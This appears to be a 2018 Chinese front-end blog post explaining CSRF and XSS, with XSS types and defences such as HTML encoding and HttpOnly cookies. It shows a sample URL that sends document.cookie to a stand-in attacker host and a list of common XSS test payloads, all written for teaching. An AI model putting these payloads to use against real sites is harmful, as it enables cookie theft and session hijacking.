@@ -1,0 +1,1038 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-center-circle.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.5.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/LogoZHY.png?v=6.5.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/LogoZHY.png?v=6.5.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/LogoZHY.png?v=6.5.0">
+
+
+  <link rel="mask-icon" href="/images/zhylogo.svg?v=6.5.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.5.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="跨站请求伪造，英文为：CSRF/ XSRF (Cross-site request forgery/ one-click attack/ session riding) 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。  跨站脚本攻击，英文为：XSS (Cross-site scripting) 命名是为了和层叠样式表(英文Cascading Style Sheets, C">
+<meta name="keywords" content="网络安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS 和CSRF">
+<meta property="og:url" content="http://huiyuanzhu.github.io/blog/2018/12/07/Web-XSS-和CSRF/index.html">
+<meta property="og:site_name" content="ZHY Blog">
+<meta property="og:description" content="跨站请求伪造，英文为：CSRF/ XSRF (Cross-site request forgery/ one-click attack/ session riding) 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。  跨站脚本攻击，英文为：XSS (Cross-site scripting) 命名是为了和层叠样式表(英文Cascading Style Sheets, C">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-01-08T00:14:54.171Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XSS 和CSRF">
+<meta name="twitter:description" content="跨站请求伪造，英文为：CSRF/ XSRF (Cross-site request forgery/ one-click attack/ session riding) 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。  跨站脚本攻击，英文为：XSS (Cross-site scripting) 命名是为了和层叠样式表(英文Cascading Style Sheets, C">
+
+
+
+
+
+
+  <link rel="canonical" href="http://huiyuanzhu.github.io/blog/2018/12/07/Web-XSS-和CSRF/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>XSS 和CSRF | ZHY Blog</title>
+  
+
+
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-130189155-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-130189155-1');
+</script>
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ZHY Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">Day Day Up</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-commonweal">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/404/" rel="section"><i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>公益 404</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://huiyuanzhu.github.io/blog/2018/12/07/Web-XSS-和CSRF/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Huiyuan Zhu">
+      <meta itemprop="description" content="Front-end interview and development">
+      <meta itemprop="image" content="/images/zhylogo.svg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZHY Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">XSS 和CSRF
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-12-07 10:28:25" itemprop="dateCreated datePublished" datetime="2018-12-07T10:28:25+08:00">2018-12-07</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-01-08 08:14:54" itemprop="dateModified" datetime="2019-01-08T08:14:54+08:00">2019-01-08</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/前端开发/" itemprop="url" rel="index"><span itemprop="name">前端开发</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/前端开发/网络安全/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="跨站请求伪造，英文为：CSRF-XSRF-Cross-site-request-forgery-one-click-attack-session-riding"><a href="#跨站请求伪造，英文为：CSRF-XSRF-Cross-site-request-forgery-one-click-attack-session-riding" class="headerlink" title="跨站请求伪造，英文为：CSRF/ XSRF (Cross-site request forgery/ one-click attack/ session riding)"></a>跨站请求伪造，英文为：CSRF/ XSRF (Cross-site request forgery/ one-click attack/ session riding)</h2><ol>
+<li>是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。</li>
+</ol>
+<h2 id="跨站脚本攻击，英文为：XSS-Cross-site-scripting"><a href="#跨站脚本攻击，英文为：XSS-Cross-site-scripting" class="headerlink" title="跨站脚本攻击，英文为：XSS (Cross-site scripting)"></a>跨站脚本攻击，英文为：XSS (Cross-site scripting)</h2><ol>
+<li>命名是为了和层叠样式表(英文Cascading Style Sheets, CSS)区分而采用X开头。</li>
+<li>原理和危害：利用网页安全漏洞，将恶意代码注入到网页中，当用户打开网页时，网页服务器会发送该可执行代码给浏览器，该段恶意代码（大多是JavaScript）会在浏览器中被执行，攻击者可能可以获取更高的权限、读取私密的网页内容、会话和cookie等各种内容。</li>
+<li>攻击手段和目的：<ul>
+<li>Dom-based XSS 漏洞：<strong>威胁个别用户</strong>。用户在网站A 点击收到的邮箱或者QQ等恶意链接（被伪装的， 常见的钓鱼式攻击，英文为：Phishing），用户一旦点击该链接，那么该网页上的像cookie这样包含敏感信息的内容则会被发送到攻击者创建的保存盗窃信息的网站中。<blockquote>
+<p><code>http://victim.com/search.asp?term=&lt;script&gt;window.open(&quot;http://badguy.com?cookie=&quot;+document.cookie)&lt;/script&gt;</code></p>
+</blockquote>
+</li>
+<li>Stored(存储式) XSS 漏洞：应用广泛，影响范围包括网站<strong>所有访问该页面的用户</strong>。攻击脚本会被传送并保存在服务器上，每次用户访问时发送改代码到客户端页面，运行时收集所有访问该页面的用户信息。</li>
+<li>iframe/ frame/ XMLHttpRequest：代表用户采取动作，例如：发微博，加好友。</li>
+<li>利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</li>
+<li>在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS攻击的效果。</li>
+</ul>
+</li>
+<li><p>修复措施：</p>
+<ul>
+<li>同源策略(same origin policy)：访问控制<blockquote>
+<p>对于会同时打开多个浏览器窗口的用户，为了防止从另一个浏览器跨网页或者对象读取数据，仅允许来自<strong>相同域名系统和使用相同协议的对象和网页之间</strong>的任何交互。</p>
+</blockquote>
+</li>
+<li><p>HTML Encode处理：对HTML进行转码，例如<code>&lt; =&gt; &amp;lt;</code></p>
+<blockquote>
+<p>网站对于用户输入的内容进行检测，查看是否含有特殊字符，同理，也可以用特殊字符测试网站是否能防止特殊字符的攻击。</p>
+</blockquote>
+<p>区分<strong>URL Encode</strong><br>URL编码是为了符合规范而对非字母数字字符进行编码，这些字符会被转换成百分号<code>%</code>后跟两位十六进制数，空格则编码为<code>+</code>。例如：<br><code></code></p>
+<p><em>常见的特殊字符攻击方式有：</em></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">=&apos;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(vulnerable)&lt;/script&gt;</span><br><span class="line">%3Cscript%3Ealert(&apos;XSS&apos;)%3C/script%3E</span><br><span class="line">&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;</span><br><span class="line">&lt;img src=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">&lt;img src=&quot;http://888.888.com/999.png&quot; onerror=&quot;alert(&apos;XSS&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p><em>常见的HTML过滤方式有：</em></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP：htmlentities() 或是htmlspecialchars()。</span><br><span class="line">Python：cgi.escape()。</span><br><span class="line">ASP：Server.HTMLEncode()。</span><br><span class="line">ASP.NET：Server.HtmlEncode()或功能更强的Microsoft Anti-Cross Site Scripting Library</span><br><span class="line">Java：xssprotect (Open Source Library)。</span><br><span class="line">Node.js：node-validator。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>HttpOnly<br>重要cookie 设置为HttpOnly，使得客户端没有操作cookie的权限，JavaScript 中的document.cookie 无法读取cookie。</p>
+</li>
+<li><p>限制用户的输入格式： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;number&quot; /&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>过滤JavaScript事件的标签，例如<code>&quot;onclick=&quot;</code></p>
+</li>
+<li>过滤或者移除特殊的HTML标签，例如<code>&lt;iframe&gt;</code></li>
+</ul>
+</li>
+</ol>
+<p>参考文档：<br><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC" target="_blank" rel="noopener">跨站脚本</a><br><a href="https://www.cnblogs.com/TankXiao/archive/2012/03/21/2337194.html" target="_blank" rel="noopener">Web安全测试之XSS</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/网络安全/" rel="tag"># 网络安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/04/网络原理-HTTP-vs-HTTPS/" rel="next" title="HTTP vs HTTPS">
+                <i class="fa fa-chevron-left"></i> HTTP vs HTTPS
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/12/22/Windows-Antimalware-Service-Executable-在Windows-10中占用高内存问题/" rel="prev" title="Antimalware Service Executable 在Windows 10中占用大量CPU问题">
+                Antimalware Service Executable 在Windows 10中占用大量CPU问题 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/zhylogo.svg" alt="Huiyuan Zhu">
+            
+              <p class="site-author-name" itemprop="name">Huiyuan Zhu</p>
+              <p class="site-description motion-element" itemprop="description">Front-end interview and development</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">26</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">18</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">22</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/huiyuanzhu" title="GitHub &rarr; https://github.com/huiyuanzhu" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:zhysarah1024@gmail.com" title="E-Mail &rarr; mailto:zhysarah1024@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.yaleyoo.com" title="https://www.yaleyoo.com" rel="noopener" target="_blank">Yaleyoo</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#跨站请求伪造，英文为：CSRF-XSRF-Cross-site-request-forgery-one-click-attack-session-riding"><span class="nav-number">1.</span> <span class="nav-text">跨站请求伪造，英文为：CSRF/ XSRF (Cross-site request forgery/ one-click attack/ session riding)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#跨站脚本攻击，英文为：XSS-Cross-site-scripting"><span class="nav-number">2.</span> <span class="nav-text">跨站脚本攻击，英文为：XSS (Cross-site scripting)</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Huiyuan Zhu</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v6.5.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.5.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.5.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.5.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.5.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.5.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
